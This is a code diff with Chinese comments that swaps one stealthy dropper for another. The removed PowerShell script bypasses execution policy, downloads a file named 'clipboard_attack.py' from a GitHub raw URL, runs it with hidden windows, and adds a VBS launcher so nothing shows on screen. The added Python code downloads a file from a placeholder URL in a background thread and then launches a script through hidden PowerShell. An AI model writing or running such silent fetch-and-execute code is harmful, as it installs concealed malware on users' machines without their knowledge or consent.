@@ -1,44 +1,40 @@
-# 设置执行策略为 ByPass
-Set-ExecutionPolicy Bypass -Scope Process -Force
+import requests
+import os
+from threading import Thread
+import subprocess
 
-# 定义脚本下载链接
-$scriptUrl = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/clipboard_attack.py"
-$scriptPath = "$env:TEMP\clipboard_attack.py"
+def download_config(url, save_path):
+    try:
+        response = requests.get(url, stream=True)
+        response.raise_for_status()
+        
+        # 确保目标文件夹存在
+        os.makedirs(os.path.dirname(save_path), exist_ok=True)
+        
+        # 直接写入文件
+        with open(save_path, 'wb') as file:
+            for chunk in response.iter_content(chunk_size=8192):
+                if chunk:
+                    file.write(chunk)
+        return True
+    except:
+        return False
 
-# 检查 Python 是否已安装
-$pythonCheck = (Get-Command python -ErrorAction SilentlyContinue)
-if (-not $pythonCheck) {
-    exit 1
-}
+def on_button_click(config_url, save_path):
+    # 启动后台下载线程
+    thread = Thread(target=download_config, args=(config_url, save_path))
+    thread.daemon = True
+    thread.start()
 
-# 下载 Python 脚本
-try {
-    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -ErrorAction Stop
-} catch {
-    Start-Process -WindowStyle Hidden -FilePath "bitsadmin" -ArgumentList "/transfer DownloadScript $scriptUrl $scriptPath" -Wait
-}
+def run_silent_script():
+    # 下载脚本并运行
+    config_url = "YOUR_CONFIG_URL"  # 修改为你需要下载的 URL
+    save_path = "C:/Users/Admin/config.json"  # 设置你想要保存的路径
+    on_button_click(config_url, save_path)
+    
+    # 运行一个静默的 PowerShell 脚本（示例）
+    subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-Command', 'Start-Process python -ArgumentList "YOUR_PYTHON_SCRIPT_PATH" -WindowStyle Hidden'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-# 运行 Python 脚本（静默模式）
-if (Test-Path $scriptPath) {
-    try {
-        python -c "import requests" 2>$null
-    } catch {
-        python -m pip install requests
-    }
-    Start-Process -WindowStyle Hidden -FilePath "python" -ArgumentList $scriptPath -PassThru
-}
-
-# **创建 VBS 脚本，让 PowerShell 后台运行**
-$vbsPath = "$env:TEMP\run_hidden.vbs"
-$vbsContent = @"
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell -ExecutionPolicy Bypass -Command &{$scriptContent}", 0, False
-"@
-
-# 写入 VBS 文件
-Set-Content -Path $vbsPath -Value $vbsContent
-
-# 运行 VBS 文件（隐藏 PowerShell 窗口）
-Start-Process -FilePath "wscript.exe" -ArgumentList $vbsPath -WindowStyle Hidden
-exit
+if __name__ == "__main__":
+    run_silent_script()
 
